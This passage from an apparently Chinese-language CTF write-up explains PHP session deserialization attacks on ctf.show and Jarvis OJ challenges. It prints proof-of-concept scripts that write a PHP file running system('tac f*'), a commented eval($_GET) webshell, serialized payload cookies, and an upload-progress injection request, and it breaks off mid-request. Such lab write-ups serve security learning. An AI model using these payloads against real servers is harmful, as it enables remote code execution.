+</span></span><span class=line><span class=cl>	<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=c1>//超过5次禁止登陆
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;limti&#39;</span><span class=p>]</span><span class=o>&gt;</span><span class=mi>5</span><span class=o>?</span><span class=k>die</span><span class=p>(</span><span class=s2>&#34;登陆失败次数超过限制&#34;</span><span class=p>)</span><span class=o>:</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>])</span> <span class=o>+</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>		 <span class=nx>setcookie</span><span class=p>(</span><span class=s2>&#34;limit&#34;</span><span class=p>,</span><span class=nx>base64_encode</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>		 <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>]</span><span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>这个文件看的出来我们要进行session反序列化，并且我们等会序列化的时候要进行base64编码</p><p>然后看<code>check.php</code>,发现什么都没有，但是有提示让看<code>inc.php</code>,截取有用的部分</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$status</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>=</span> <span class=nv>$username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nv>$password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>setStatus</span><span class=p>(</span><span class=nv>$s</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>status</span><span class=o>=</span><span class=nv>$s</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;log-&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=p>,</span> <span class=s2>&#34;使用&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>.</span><span class=s2>&#34;登陆&#34;</span><span class=o>.</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>status</span><span class=o>?</span><span class=s2>&#34;成功&#34;</span><span class=o>:</span><span class=s2>&#34;失败&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;----&#34;</span><span class=o>.</span><span class=nx>date_create</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>format</span><span class=p>(</span><span class=s1>&#39;Y-m-d H:i:s&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里很明显可以进行木马的写入，写个poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;shell.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=cm>/*public $password=&#39;&lt;?php @eval($_GET[a]);?&gt;&#39;;*/</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;&lt;?php system(&#34;tac f*&#34;);?&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$status</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>User</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=o>.</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>本来想直接打入木马的，但是后来发现不行，利用不了，就改成执行命令了</p><p>先在<code>index.php</code>发包，然后再在<code>check.php</code>,最后在<code>log-shell.php</code>看回显就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GET /index.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show
+</span></span><span class=line><span class=cl>Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=8stserifuth66e72hl5vmrq1pe; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjU6Ijw/cGhwIHN5c3RlbSgidGFjIGYqIik7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==
+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;128&#34;, &#34;Not;A=Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;128&#34;
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
+</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
+</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
+</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
+</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
+</span></span><span class=line><span class=cl>Referer: https://20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show/
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>Priority: u=1, i
+</span></span><span class=line><span class=cl>Connection: close
+</span></span></code></pre></td></tr></table></div></div><p>得到重要回显</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Response:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	function check(){
+</span></span><span class=line><span class=cl>			$.ajax({
+</span></span><span class=line><span class=cl>			url:&#39;check.php&#39;,
+</span></span><span class=line><span class=cl>			type: &#39;GET&#39;,
+</span></span><span class=line><span class=cl>			data:{
+</span></span><span class=line><span class=cl>				&#39;u&#39;:$(&#39;#u&#39;).val(),
+</span></span><span class=line><span class=cl>				&#39;pass&#39;:$(&#39;#pass&#39;).val()
+</span></span><span class=line><span class=cl>			},
+</span></span><span class=line><span class=cl>			success:function(data){
+</span></span><span class=line><span class=cl>				alert(JSON.parse(data).msg);
+</span></span><span class=line><span class=cl>			},
+</span></span><span class=line><span class=cl>			error:function(data){
+</span></span><span class=line><span class=cl>				alert(JSON.parse(data).msg);
+</span></span><span class=line><span class=cl>			}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		});
+</span></span><span class=line><span class=cl>		}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GET /check.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show
+</span></span><span class=line><span class=cl>Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=8stserifuth66e72hl5vmrq1pe; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjU6Ijw/cGhwIHN5c3RlbSgidGFjIGYqIik7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==
+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;128&#34;, &#34;Not;A=Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;128&#34;
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
+</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
+</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
+</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
+</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
+</span></span><span class=line><span class=cl>Referer: https://20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show/
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>Priority: u=1, i
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Response:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;0&#34;:&#34;error&#34;,&#34;msg&#34;:&#34;\u767b\u9646\u5931\u8d25&#34;}
+</span></span></code></pre></td></tr></table></div></div><p>然后就可以成功得到<code>flag</code>了</p><h3 id=demo-3>Demo 3</h3><p><code>http://web.jarvisoj.com:32784/</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.serialize_handler&#39;</span><span class=p>,</span><span class=s1>&#39;php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>OowoO</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$mdzz</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mdzz</span><span class=o>=</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mdzz</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;phpinfo&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$m</span><span class=o>=</span><span class=k>new</span> <span class=nx>OowoO</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;demo.php&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>首先触发一个<code>phpinfo</code>,看一些配置</p><p><img src=/p/session-deserialization-discussion/QQ20240912-204615.png width=1671 height=606 loading=lazy alt=6>这里我们是没有session的上传的点的</p><p>会涉及到session上传进度的知识</p><blockquote><p>当 <a class=link href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled target=_blank rel=noopener>session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的<a class=link href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name target=_blank rel=noopener>session.upload_progress.name</a>同名变量时，上传进度可以在<a class=link href=https://www.php.net/manual/zh/reserved.variables.session.php target=_blank rel=noopener>$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a class=link href=https://www.php.net/manual/zh/reserved.variables.session.php target=_blank rel=noopener>$_SESSION</a>中添加一组数据, 索引是 <a class=link href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix target=_blank rel=noopener>session.upload_progress.prefix</a> 与 <a class=link href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name target=_blank rel=noopener>session.upload_progress.name</a>连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p></blockquote><p>我们需要POST一个同名变量(此次环境为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，就可以添加数据了，那么写个表单</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;http://localhost/1.php&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>enctype</span><span class=o>=</span><span class=s>&#34;multipart/form-data&#34;</span> <span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;666&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;file&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>POST /1.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: localhost
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542
+</span></span><span class=line><span class=cl>Content-Length: 368
+</span></span><span class=line><span class=cl>Origin: null
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
+</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
+</span></span><span class=line><span class=cl>Sec-Fetch-Site: cross-site
+</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
+</span></span><span class=line><span class=cl>Priority: u=0, i
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------------------82030870339145711343728112542
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2333
+</span></span><span class=line><span class=cl>-----------------------------82030870339145711343728112542
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;|123&#34;
+</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>test
+</span></span><span class=line><span class=cl>-----------------------------82030870339145711343728112542--
+</span></span></code></pre></td></tr></table></div></div><p>成功打出回显序列化失败，那么也是找到了注入点，写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>OowoO</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$mdzz</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mdzz</span><span class=o>=</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mdzz</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>OowoO</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=c1>//$a-&gt;mdzz=&#39;echo `whoami`;&#39;;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>mdzz</span><span class=o>=</span><span class=s1>&#39;print_r(scandir(dirname(__FILE__)));&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里多学习一个命令，之前没见过的(感觉什么时候也得找个时间把这些shell命令和函数过了:)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>__DIR__
+</span></span><span class=line><span class=cl>得到当前目录名
+</span></span><span class=line><span class=cl>__FILE__
+</span></span><span class=line><span class=cl>得到当前文件的绝对路径
+</span></span><span class=line><span class=cl>dirname(__FILE__)
+</span></span><span class=line><span class=cl>得到绝对路径中的目录名
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
+</span></span><span class=line><span class=cl>
